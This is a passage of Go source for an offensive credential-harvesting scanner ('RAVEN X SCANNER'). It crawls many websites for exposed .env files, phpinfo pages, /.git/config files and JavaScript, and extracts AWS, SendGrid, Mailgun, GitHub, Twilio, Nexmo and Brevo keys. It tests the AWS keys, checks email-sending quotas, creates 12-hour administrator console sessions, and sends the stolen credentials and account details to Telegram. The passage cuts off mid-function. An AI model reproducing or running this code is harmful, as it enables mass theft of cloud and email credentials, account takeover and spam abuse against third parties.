					snsReport = "SNS Limit (All Regions)\n"
					for region, limit := range snsInfo {
						snsReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ 💰 MonthlySpendLimit: %.0f\n", region, limit)
					}
				} else {
					snsReport = "SNS Limit\n- No SNS limit found in any region\n"
				}

				fargateReport := ""
				if len(fargateInfo) > 0 {
					fargateReport = "Fargate On-Demand vCPU Limits (All Regions)\n"
					for region, value := range fargateInfo {
						fargateReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ vCPU On-Demand Limit: %.0f\n", region, value)
					}
				} else {
					fargateReport = "Fargate On-Demand vCPU Limits\n- No Fargate on-demand limits available in any region\n"
				}

				federationReport := ""
				if federationInfo != nil {
					federationReport = fmt.Sprintf("Federation Console (AdministratorAccess, 12h)\n- Console URL: %s\n- Session Name: %s\n- Expires At: %s\n- ARN: %s\n",
						federationInfo["federation_console_url"], federationInfo["session_name"], federationInfo["expires_at"], federationInfo["arn"])
					a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sourceURL, ak, sk, federationInfo["federation_console_url"], federationInfo["expires_at"]), "FederationConsole.txt")
				} else {
					federationReport = "Federation Console\n- Failed to get federation console URL\n"
				}

				if shouldSend {
					if len(sendRegions) > 0 {
						sesReport = "📧 SES Quota Info (Filtered)\n"
						for _, d := range sendRegions {
							healthEmoji := "❤️"
							if d.HealthUpper != "HEALTHY" {
								healthEmoji = "❌"
							}
							sesReport += fmt.Sprintf("  ├ 📍 Region: %s\n  ├ 📦 Quota: %.0f\n  ├ 📤 Sent (24h): %.0f\n  └ %s Health: %s\n",
								d.Region, d.Quota, d.LastSend, healthEmoji, d.Health)
						}
					}
					msg := fmt.Sprintf("<b>RAVEN X SCANNER</b>\n\n<b>VALID AWS CREDENTIAL (dir)</b>\n<code>%s:%s</code>\nURL: %s\nAccount: %s\n\n%s\n%s\n%s\n%s",
						ak, sk, sourceURL, *identity.Arn, sesReport, snsReport, fargateReport, federationReport)
					go a.sendTelegram(msg)
				}
			}
		}
	}

	var patterns []*regexp.Regexp
	if a.Config.Features.SendGrid {
		patterns = append(patterns, a.SendGridAPIKeyPatternInfo)
	}
	if a.Config.Features.Mailgun {
		patterns = append(patterns, a.MailgunAPIKeyPatternInfo)
	}
	if a.Config.Features.GitHub {
		patterns = append(patterns, a.GitHubAccessTokenPatternInfo)
	}
	if a.Config.Features.Twilio {
		patterns = append(patterns, a.TwilioSIDPatternInfo)
		patterns = append(patterns, a.TwilioEncodePatternInfo)
	}
	if a.Config.Features.Telnyx {
		patterns = append(patterns, a.TelnyxApiPatternInfo)
	}

	for _, pattern := range patterns {
		for _, key := range unique(pattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s Key Found (dir): %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "dir_keys.txt")
		}
	}

	// Handle Twilio with updated method
	a.extractTwilioCredentials(text, sourceURL)

	// Handle Nexmo patterns
	if a.Config.Features.Nexmo {
		apiKeyMatches := a.NexmoApiPatternInfo.FindAllStringSubmatch(text, -1)
		for _, match := range apiKeyMatches {
			if len(match) > 2 {
				key := match[2]
				fmt.Printf("%s[!]%s Nexmo API Key Found (dir): %s from %s\n", YELLOW, RESET, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "dir_keys.txt")
			}
		}
		
		apiSecretMatches := a.NexmoSecretPatternInfo.FindAllStringSubmatch(text, -1)
		for _, match := range apiSecretMatches {
			if len(match) > 2 {
				key := match[2]
				fmt.Printf("%s[!]%s Nexmo API Secret Found (dir): %s from %s\n", YELLOW, RESET, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "dir_keys.txt")
			}
		}
	}

	a.checkAndSaveKeys(text, sourceURL)
	a.extractAndTestSMTP(text, sourceURL)
}

func (a *AWSScanner) checkForKeys(jsURL string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	resp, err := client.Get(jsURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	text := string(body)

	a.checkAndSaveKeys(text, jsURL)

	if a.Config.Features.AWS {
		aks := unique(a.AWSAccessKeyPatternInfo.FindAllString(text, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(text, -1))

		for _, ak := range aks {
			for _, sk := range sks {
				if !strings.ContainsAny(sk, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") || !strings.ContainsAny(sk, "0123456789") {
					continue
				}
				if a.alreadySent(ak, sk) {
					continue
				}
				fmt.Printf("%s[✓]%s AWS: %s:%s from %s\n", GREEN, RESET, ak, sk, jsURL)
				valid, identity, cfg := a.validateAWSCredentials(ak, sk)
				if !valid {
					continue
				}
				a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", jsURL, ak, sk, a.DefaultRegion), "aws_credentials.txt")

				sesInfo := a.checkSESDetailsAllRegions(cfg)
				snsInfo := a.checkSNSLimitAllRegions(cfg)
				fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
				federationInfo := a.getFederationConsoleURL(cfg, 43200)

				type sesRegionDetail struct {
					Region      string
					Quota       float64
					LastSend    float64
					Health      string
					HealthUpper string
				}

				var sesRegions []sesRegionDetail
				var above200Regions []sesRegionDetail
				var usEast1Detail *sesRegionDetail

				sesReport := ""
				if len(sesInfo) > 0 {
					sesReport += "📧 SES Quota Info (All Regions)\n"
					for region, details := range sesInfo {
						quota := details["SendQuota"].(float64)
						lastSend := details["LastSend"].(float64)
						health := details["HealthStatus"].(string)
						healthUpper := strings.ToUpper(health)
						detail := sesRegionDetail{
							Region:      region,
							Quota:       quota,
							LastSend:    lastSend,
							Health:      health,
							HealthUpper: healthUpper,
						}
						sesRegions = append(sesRegions, detail)
						if quota > 200 && healthUpper == "HEALTHY" {
							above200Regions = append(above200Regions, detail)
						}
						if region == "us-east-1" {
							tmp := detail
							usEast1Detail = &tmp
						}
					}
					var sendRegions []sesRegionDetail
					if len(above200Regions) > 0 {
						sendRegions = above200Regions
					} else if usEast1Detail != nil {
						sendRegions = []sesRegionDetail{*usEast1Detail}
					} else {
						sendRegions = sesRegions
					}
					for _, d := range sendRegions {
						healthEmoji := "❤️"
						if d.HealthUpper != "HEALTHY" {
							healthEmoji = "❌"
						}
						sesReport += fmt.Sprintf("  ├ 📍 Region: %s\n  ├ 📦 Quota: %.0f\n  ├ 📤 Sent (24h): %.0f\n  └ %s Health: %s\n",
							d.Region, d.Quota, d.LastSend, healthEmoji, d.Health)
					}
				}

				snsReport := ""
				if len(snsInfo) > 0 {
					snsReport = "SNS Limit (All Regions)\n"
					for region, limit := range snsInfo {
						snsReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ 💰 MonthlySpendLimit: %.0f\n", region, limit)
					}
				} else {
					snsReport = "SNS Limit\n- No SNS limit found in any region\n"
				}

				fargateReport := ""
				if len(fargateInfo) > 0 {
					fargateReport = "Fargate On-Demand vCPU Limits (All Regions)\n"
					for region, value := range fargateInfo {
						fargateReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ vCPU On-Demand Limit: %.0f\n", region, value)
					}
				} else {
					fargateReport = "Fargate On-Demand vCPU Limits\n- No Fargate on-demand limits available in any region\n"
				}

				federationReport := ""
				if federationInfo != nil {
					federationReport = fmt.Sprintf("Federation Console (AdministratorAccess, 12h)\n- Console URL: %s\n- Session Name: %s\n- Expires At: %s\n- ARN: %s\n",
						federationInfo["federation_console_url"], federationInfo["session_name"], federationInfo["expires_at"], federationInfo["arn"])
					a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", jsURL, ak, sk, federationInfo["federation_console_url"], federationInfo["expires_at"]), "FederationConsole.txt")
				} else {
					federationReport = "Federation Console\n- Failed to get federation console URL\n"
				}

				hasValidQuota := false
				if len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0 || (federationInfo != nil && federationInfo["federation_console_url"] != "") {
					hasValidQuota = true
				}

				if hasValidQuota {
					msg := fmt.Sprintf("<b>RAVEN X SCANNER</b>\n\n<b>VALID AWS CREDENTIAL</b>\n<code>%s:%s</code>\nURL: %s\nAccount: %s\n\n%s\n%s\n%s\n%s",
						ak, sk, jsURL, *identity.Arn, sesReport, snsReport, fargateReport, federationReport)
					go a.sendTelegram(msg)
				}
			}
		}
	}
}

func (a *AWSScanner) checkGitConfig(proto, domain string) {
	if !a.Config.Features.GitHub {
		return
	}
	gitURL := fmt.Sprintf("%s://%s/.git/config", proto, domain)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(gitURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	text := string(body)
	a.checkAndSaveKeys(text, gitURL)
	tokens := unique(a.GitHubAccessTokenPattern.FindAllString(text, -1))
	for _, token := range tokens {
		fmt.Printf("%s[!]%s GitHub Token Found: %s from %s\n", YELLOW, RESET, token, gitURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", gitURL, token), "validgit.txt")
		go a.sendTelegram(fmt.Sprintf("🔑 <b>GitHub Token Found</b>\nURL: <code>%s</code>\nToken: <code>%s</code>", gitURL, token))
	}
}

func (a *AWSScanner) scanPHPInfo(fullURL string) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(fullURL)
	if err != nil || resp.StatusCode != 200 {
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	htmlStr := string(body)

	re := regexp.MustCompile(`<tr>\s*<td\s+class=["']e["']\s*>([^<]+)</td>\s*<td\s+class=["']v["']\s*>([^<]+)</td>.*?</tr>`)
	matches := re.FindAllStringSubmatch(htmlStr, -1)

	var combinedLines []string
	for _, m := range matches {
		if len(m) >= 3 {
			key := strings.TrimSpace(m[1])
			val := strings.TrimSpace(m[2])
			combinedLines = append(combinedLines, fmt.Sprintf("%s=%s", key, val))
		}
	}

	joinedText := strings.Join(combinedLines, "\n")
	a.checkAndSaveKeysFromPHPInfo(joinedText, fullURL)
}

func (a *AWSScanner) checkAndSaveKeysFromPHPInfo(text, sourceURL string) {
	if a.Config.Features.AWS {
		aks := unique(a.AWSAccessKeyPatternInfo.FindAllString(text, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(text, -1))

		for _, ak := range aks {
			for _, sk := range sks {
				if !strings.ContainsAny(sk, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") || !strings.ContainsAny(sk, "0123456789") {
					continue
				}
				if a.alreadySent(ak, sk) {
					continue
				}
				fmt.Printf("%s[✓]%s AWS (phpinfo): %s:%s from %s\n", GREEN, RESET, ak, sk, sourceURL)
				valid, identity, cfg := a.validateAWSCredentials(ak, sk)
				if !valid {
					continue
				}
				a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, ak, sk, a.DefaultRegion), "aws_credentials.txt")

				sesInfo := a.checkSESDetailsAllRegions(cfg)
				snsInfo := a.checkSNSLimitAllRegions(cfg)
				fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
				federationInfo := a.getFederationConsoleURL(cfg, 43200)

				hasValidQuota := false
				if len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0 || (federationInfo != nil && federationInfo["federation_console_url"] != "") {
					hasValidQuota = true
				}

				sesReport := ""
				if len(sesInfo) > 0 {
					sesReport += "📧 SES Quota Info (All Regions)\n"
					for region, details := range sesInfo {
						health := details["HealthStatus"].(string)
						healthEmoji := "❤️"
						if strings.ToUpper(health) != "HEALTHY" {
							healthEmoji = "❌"
						}
						sesReport += fmt.Sprintf("  ├ 📍 Region: %s\n  ├ 📦 Quota: %.0f\n  ├ 📤 Sent (24h): %.0f\n  └ %s Health: %s\n",
							region, details["SendQuota"].(float64), details["LastSend"].(float64), healthEmoji, health)
					}
				} else {
					sesReport += "📧 SES Quota Info\n- No SES quota found in any region\n"
				}

				snsReport := ""
				if len(snsInfo) > 0 {
					snsReport = "SNS Limit (All Regions)\n"
					for region, limit := range snsInfo {
						snsReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ 💰 MonthlySpendLimit: %.0f\n", region, limit)
					}
				} else {
					snsReport = "SNS Limit\n- No SNS limit found in any region\n"
				}

				fargateReport := ""
				if len(fargateInfo) > 0 {
					fargateReport = "Fargate On-Demand vCPU Limits (All Regions)\n"
					for region, value := range fargateInfo {
						fargateReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ vCPU On-Demand Limit: %.0f\n", region, value)
					}
				} else {
					fargateReport = "Fargate On-Demand vCPU Limits\n- No Fargate on-demand limits available in any region\n"
				}

				federationReport := ""
				if federationInfo != nil {
					federationReport = fmt.Sprintf("Federation Console (AdministratorAccess, 12h)\n- Console URL: %s\n- Session Name: %s\n- Expires At: %s\n- ARN: %s\n",
						federationInfo["federation_console_url"], federationInfo["session_name"], federationInfo["expires_at"], federationInfo["arn"])
					a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sourceURL, ak, sk, federationInfo["federation_console_url"], federationInfo["expires_at"]), "FederationConsole.txt")
				} else {
					federationReport = "Federation Console\n- Failed to get federation console URL\n"
				}

				if hasValidQuota {
					msg := fmt.Sprintf("<b>RAVEN X SCANNER</b>\n\n<b>VALID AWS CREDENTIAL (phpinfo)</b>\n<code>%s:%s</code>\nURL: %s\nAccount: %s\n\n%s\n%s\n%s\n%s",
						ak, sk, sourceURL, *identity.Arn, sesReport, snsReport, fargateReport, federationReport)
					go a.sendTelegram(msg)
				}
			}
		}
	}

	var patterns []*regexp.Regexp
	if a.Config.Features.SendGrid {
		patterns = append(patterns, a.SendGridAPIKeyPatternInfo)
	}
	if a.Config.Features.Mailgun {
		patterns = append(patterns, a.MailgunAPIKeyPatternInfo)
	}
	if a.Config.Features.GitHub {
		patterns = append(patterns, a.GitHubAccessTokenPatternInfo)
	}
	if a.Config.Features.Twilio {
		patterns = append(patterns, a.TwilioSIDPatternInfo)
		patterns = append(patterns, a.TwilioEncodePatternInfo)
	}
	if a.Config.Features.Telnyx {
		patterns = append(patterns, a.TelnyxApiPatternInfo)
	}

	for _, pattern := range patterns {
		for _, key := range unique(pattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s Key Found (phpinfo): %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "phpinfo_keys.txt")
		}
	}

	// Handle Twilio with updated method
	a.extractTwilioCredentials(text, sourceURL)

	// Handle Nexmo patterns
	if a.Config.Features.Nexmo {
		apiKeyMatches := a.NexmoApiPatternInfo.FindAllStringSubmatch(text, -1)
		for _, match := range apiKeyMatches {
			if len(match) > 2 {
				key := match[2]
				fmt.Printf("%s[!]%s Nexmo API Key Found (phpinfo): %s from %s\n", YELLOW, RESET, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "phpinfo_keys.txt")
			}
		}
		
		apiSecretMatches := a.NexmoSecretPatternInfo.FindAllStringSubmatch(text, -1)
		for _, match := range apiSecretMatches {
			if len(match) > 2 {
				key := match[2]
				fmt.Printf("%s[!]%s Nexmo API Secret Found (phpinfo): %s from %s\n", YELLOW, RESET, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "phpinfo_keys.txt")
			}
		}
	}

	a.checkAndSaveKeys(text, sourceURL)
	a.extractAndTestSMTP(text, sourceURL)
}

func (a *AWSScanner) checkAndSaveKeysFromEnv(text, sourceURL string) {
	if a.Config.Features.AWS {
		aks := unique(a.AWSAccessKeyPatternInfo.FindAllString(text, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(text, -1))

		for _, ak := range aks {
			for _, sk := range sks {
				if !strings.ContainsAny(sk, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") || !strings.ContainsAny(sk, "0123456789") {
					continue
				}
				if a.alreadySent(ak, sk) {
					continue
				}
				fmt.Printf("%s[✓]%s AWS (.env): %s:%s from %s\n", GREEN, RESET, ak, sk, sourceURL)
				valid, identity, cfg := a.validateAWSCredentials(ak, sk)
				if !valid {
					continue
				}
				a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, ak, sk, a.DefaultRegion), "aws_credentials.txt")

				sesInfo := a.checkSESDetailsAllRegions(cfg)
				snsInfo := a.checkSNSLimitAllRegions(cfg)
				fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
				federationInfo := a.getFederationConsoleURL(cfg, 43200)

				type sesRegionDetail struct {
					Region      string
					Quota       float64
					LastSend    float64
					Health      string
					HealthUpper string
				}

				var sesRegions []sesRegionDetail
				var above200Regions []sesRegionDetail
				var usEast1Detail *sesRegionDetail

				sesReport := ""
				if len(sesInfo) > 0 {
					sesReport += "📧 SES Quota Info (All Regions)\n"
					for region, details := range sesInfo {
						quota := details["SendQuota"].(float64)
						lastSend := details["LastSend"].(float64)
						health := details["HealthStatus"].(string)
						healthUpper := strings.ToUpper(health)
						detail := sesRegionDetail{
							Region:      region,
							Quota:       quota,
							LastSend:    lastSend,
							Health:      health,
							HealthUpper: healthUpper,
						}
						sesRegions = append(sesRegions, detail)
						if region == "us-east-1" {
							usEast1Detail = &detail
						}
						if quota > 200 && healthUpper == "HEALTHY" {
							above200Regions = append(above200Regions, detail)
						}
					}
					var sendRegions []sesRegionDetail
					if len(above200Regions) > 0 {
						sendRegions = above200Regions
					} else if usEast1Detail != nil {
						sendRegions = []sesRegionDetail{*usEast1Detail}
					}
					for _, d := range sendRegions {
						healthEmoji := "❤️"
						if d.HealthUpper != "HEALTHY" {
							healthEmoji = "❌"
						}
						sesReport += fmt.Sprintf("  ├ 📍 Region: %s\n  ├ 📦 Quota: %.0f\n  ├ 📤 Sent (24h): %.0f\n  └ %s Health: %s\n",
							d.Region, d.Quota, d.LastSend, healthEmoji, d.Health)
					}
				}

				snsReport := ""
				if len(snsInfo) > 0 {
					snsReport = "SNS Limit (All Regions)\n"
					for region, limit := range snsInfo {
						snsReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ 💰 MonthlySpendLimit: %.0f\n", region, limit)
					}
				} else {
					snsReport = "SNS Limit\n- No SNS limit found in any region\n"
				}

				fargateReport := ""
				if len(fargateInfo) > 0 {
					fargateReport = "Fargate On-Demand vCPU Limits (All Regions)\n"
					for region, value := range fargateInfo {
						fargateReport += fmt.Sprintf("  ├ 📍 Region: %s\n  └ vCPU On-Demand Limit: %.0f\n", region, value)
					}
				} else {
					fargateReport = "Fargate On-Demand vCPU Limits\n- No Fargate on-demand limits available in any region\n"
				}

				federationReport := ""
				if federationInfo != nil {
					federationReport = fmt.Sprintf("Federation Console (AdministratorAccess, 12h)\n- Console URL: %s\n- Session Name: %s\n- Expires At: %s\n- ARN: %s\n",
						federationInfo["federation_console_url"], federationInfo["session_name"], federationInfo["expires_at"], federationInfo["arn"])
					a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sourceURL, ak, sk, federationInfo["federation_console_url"], federationInfo["expires_at"]), "FederationConsole.txt")
				} else {
					federationReport = "Federation Console\n- Failed to get federation console URL\n"
				}

				if len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0 || (federationInfo != nil && federationInfo["federation_console_url"] != "") {
					msg := fmt.Sprintf("<b>RAVEN X SCANNER</b>\n\n<b>VALID AWS CREDENTIAL (.env)</b>\n<code>%s:%s</code>\nURL: %s\nAccount: %s\n\n%s\n%s\n%s\n%s",
						ak, sk, sourceURL, *identity.Arn, sesReport, snsReport, fargateReport, federationReport)
					go a.sendTelegram(msg)
				}
			}
		}
	}

	var patterns []*regexp.Regexp
	if a.Config.Features.SendGrid {
		patterns = append(patterns, a.SendGridAPIKeyPatternInfo)
	}
	if a.Config.Features.Mailgun {
		patterns = append(patterns, a.MailgunAPIKeyPatternInfo)
	}
	if a.Config.Features.GitHub {
		patterns = append(patterns, a.GitHubAccessTokenPatternInfo)
	}
	if a.Config.Features.Twilio {
		patterns = append(patterns, a.TwilioSIDPatternInfo)
		patterns = append(patterns, a.TwilioEncodePatternInfo)
	}
	if a.Config.Features.Telnyx {
		patterns = append(patterns, a.TelnyxApiPatternInfo)
	}

	for _, pattern := range patterns {
		for _, key := range unique(pattern.FindAllString(text, -1)) {
			fmt.Printf("%s[!]%s Key Found (.env): %s from %s\n", YELLOW, RESET, key, sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "env_keys.txt")
		}
	}

	// Handle Twilio with updated method
	a.extractTwilioCredentials(text, sourceURL)

	// Handle Nexmo patterns
	if a.Config.Features.Nexmo {
		apiKeyMatches := a.NexmoApiPatternInfo.FindAllStringSubmatch(text, -1)
		for _, match := range apiKeyMatches {
			if len(match) > 2 {
				key := match[2]
				fmt.Printf("%s[!]%s Nexmo API Key Found (.env): %s from %s\n", YELLOW, RESET, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "env_keys.txt")
			}
		}
		
		apiSecretMatches := a.NexmoSecretPatternInfo.FindAllStringSubmatch(text, -1)
		for _, match := range apiSecretMatches {
			if len(match) > 2 {
				key := match[2]
				fmt.Printf("%s[!]%s Nexmo API Secret Found (.env): %s from %s\n", YELLOW, RESET, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "env_keys.txt")
			}
		}
	}

	a.checkAndSaveKeys(text, sourceURL)
	a.extractAndTestSMTP(text, sourceURL)
}

func (a *AWSScanner) scanEnv(fullURL string) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(fullURL)
	if err != nil || resp.StatusCode != 200 {
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	text := string(body)
	if text != "" {
		a.checkAndSaveKeysFromEnv(text, fullURL)
	}
}

func (a *AWSScanner) scanDir(fullURL string) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(fullURL)
	if err != nil || resp.StatusCode != 200 {
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	text := string(body)
	if text != "" {
		a.checkAndSaveKeysFromDir(text, fullURL)
	}
}

func (a *AWSScanner) extractJSFromBody(htmlStr, proto, domain string) {
	scriptPattern := regexp.MustCompile(`<script.*?src=["'](.*?\.js.*?)["']`)
	found := scriptPattern.FindAllStringSubmatch(htmlStr, -1)
	for _, match := range found {
		link := match[1]
		if !a.BlacklistPattern.MatchString(link) {
			fullURL := resolveURL(fmt.Sprintf("%s://%s", proto, domain), link)
			a.checkForKeys(fullURL)
		}
	}
	hrefPattern := regexp.MustCompile(`<(?:a|link)[^>]+href=["'](.*?\.js.*?)["']`)
	foundHrefs := hrefPattern.FindAllStringSubmatch(htmlStr, -1)
	for _, match := range foundHrefs {
		link := match[1]
		if !a.BlacklistPattern.MatchString(link) {
			fullURL := resolveURL(fmt.Sprintf("%s://%s", proto, domain), link)
			a.checkForKeys(fullURL)
		}
	}
}

func resolveURL(base, ref string) string {
	u, err := url.Parse(ref)
	if err != nil {
		return ref
	}
	if u.IsAbs() {
		return ref
	}
	baseURL, err := url.Parse(base)
	if err != nil {
		return ref
	}
	return baseURL.ResolveReference(u).String()
}

func (a *AWSScanner) createRequest(domain string) {
	proto := "http"
	if strings.Contains(domain, "://") {
		parts := strings.SplitN(domain, "://", 2)
		proto, domain = parts[0], parts[1]
	}
	domain = strings.TrimRight(domain, "/")
	client := &http.Client{Timeout: 10 * time.Second}

	mainURL := fmt.Sprintf("%s://%s", proto, domain)
	resp, err := client.Get(mainURL)
	if err == nil {
		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		a.extractJSFromBody(string(body), proto, domain)
		a.checkGitConfig(proto, domain)
		fullDirURL := fmt.Sprintf("%s://%s/", proto, domain)
		go a.scanDir(fullDirURL)
		for _, path := range a.PHPInfoPaths {
			fullURL := fmt.Sprintf("%s://%s%s", proto, domain, path)
			go a.scanPHPInfo(fullURL)
		}
		for _, path := range a.EnvPaths {
			fullURL := fmt.Sprintf("%s://%s%s", proto, domain, path)
			go a.scanEnv(fullURL)
			break
		}
		return
	}

	if proto == "http" {
		mainURL = fmt.Sprintf("https://%s", domain)
		resp, err := client.Get(mainURL)
		if err == nil {
			defer resp.Body.Close()
			body, _ := ioutil.ReadAll(resp.Body)
			a.extractJSFromBody(string(body), "https", domain)
			a.checkGitConfig("https", domain)
			fullDirURL := fmt.Sprintf("https://%s/", domain)
			go a.scanDir(fullDirURL)
			for _, path := range a.PHPInfoPaths {
				fullURL := fmt.Sprintf("https://%s%s", domain, path)
				go a.scanPHPInfo(fullURL)
			}
			for _, path := range a.EnvPaths {
				fullURL := fmt.Sprintf("https://%s%s", domain, path)
				go a.scanEnv(fullURL)
				break
			}
		}
	}
}

func (a *AWSScanner) run(urls []string) {
	fmt.Printf("%s[*]%s Scanning %d URLs\n", CYAN, RESET, len(urls))
	var wg sync.WaitGroup
	sem := make(chan struct{}, 1000)

	total := len(urls)
	progressCh := make(chan struct{}, total)

	go func() {
		current := 0
		printProgressBar(current, total)
		for range progressCh {
			current++
			printProgressBar(current, total)
		}
	}()

	for _, url := range urls {
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			a.createRequest(u)
			progressCh <- struct{}{}
			<-sem
		}(url)
	}
	wg.Wait()
	close(progressCh)
	fmt.Printf("%s[✓]%s Scan complete!\n", GREEN, RESET)
}

func (a *AWSScanner) checkBrevoKey(apiKey, sourceURL string) {
	client := &http.Client{Timeout: 15 * time.Second}

	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
	req.Header.Set("api-key", apiKey)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var account struct {
		Plan          []map[string]interface{} `json:"plan"`
		Relay         map[string]interface{}   `json:"relay"`
		Marketing     map[string]interface{}   `json:"marketingAutomation"`
		User          map[string]interface{}   `json:"user"`
		Email         string                    `json:"email"`
		FirstName     string                    `json:"firstName"`
		LastName      string                    `json:"lastName"`
		CompanyName   string                    `json:"companyName"`
		Organization  string                    `json:"organizationId"`
		UserID        interface{}               `json:"userId"`
		Enterprise    bool                      `json:"enterprise"`
	}
	_ = json.Unmarshal(body, &account)

	reqSenders, _ := http.NewRequest("GET", "https://api.brevo.com/v3/senders", nil)
	reqSenders.Header.Set("api-key", apiKey)
	respSenders, err := client.Do(reqSenders)
	if err != nil {
		return
	}
	defer respSenders.Body.Close()

	sendersBody, _ := ioutil.ReadAll(respSenders.Body)
	var senders struct {
		Items []struct {
			Email string `json:"email"`
		} `json:"senders"`
	}
	_ = json.Unmarshal(sendersBody, &senders)

	plansText := ""
	for i, p := range account.Plan {
		plansText += fmt.Sprintf("   Plan #%d:\n", i+1)
		if credits, ok := p["credits"].(float64); ok {
			plansText += fmt.Sprintf("      Credits: %.0f\n", credits)
		}
		if ctype, ok := p["creditsType"].(string); ok {
			plansText += fmt.Sprintf("      CreditsType: %s\n", ctype)
		}
		if t, ok := p["type"].(string); ok {
			plansText += fmt.Sprintf("      Type: %s\n", t)
		}
	}

	sendersText := ""
	for _, s := range senders.Items {
		sendersText += fmt.Sprintf("%s\n", s.Email)
	}

	smtpRelay := ""
	smtpUser := ""
	if account.Relay != nil {
		if host, ok := account.Relay["relay"].(string); ok {
			smtpRelay = host
		}
		if user, ok := account.Relay["username"].(string); ok {
			smtpUser = user
		}
	}

	msg := fmt.Sprintf(
		"✅ RAVEN X SCANNER Brevo Valid\n\n"+
			"🔑 Apikey: %s\n\n"+
			"🔗 SMTP Relay: %s\n👤 Username: %s\n\n"+
			"📦 Plan(s):\n%s\n"+
			"• Enterprise: %v\n• LastName: %s\n• CompanyName: %s\n• Email: %s\n• FirstName: %s\n• Organization_id: %s\n• User_id: %v\n\n"+
			"📧 Senders:\n%s",
		apiKey,
		smtpRelay,
		smtpUser,
		plansText,
		account.Enterprise,
		account.LastName,
		account.CompanyName,
		account.Email,
		account.FirstName,
		account.Organization,
		account.UserID,
		sendersText,
	)

	go a.sendTelegram(msg)
}

func (a *AWSScanner) checkSendGridKey(apiKey, sourceURL string) {
	client := &http.Client{Timeout: 15 * time.Second}

	req, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/profile", nil)
	req.Header.Set("Authorization", "Bearer "+apiKey)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return
	}
	defer resp.Body.Close()

	var domains struct {
		Result []struct {
			Domain string `json:"domain"`
		} `json:"result"`
	}
	var credits struct {
		Total     int `json:"total"`
		Remaining int `json:"remaining"`
	}
	var senders []struct {
		From struct {
			Email string `json:"email"`
		} `json:"from"`
	}

	reqDomains, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/whitelabel/domains", nil)
	reqDomains.Header.Set("Authorization", "Bearer "+apiKey)
	respDomains, err := client.Do(reqDomains)
	if err == nil && respDomains.StatusCode == 200 {
		defer respDomains.Body.Close()
		body, _ := ioutil.ReadAll(respDomains.Body)
		json.Unmarshal(body, &domains)
	}

	reqCredits, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
	reqCredits.Header.Set("Authorization", "Bearer "+apiKey)
	respCredits, err := client.Do(reqCredits)
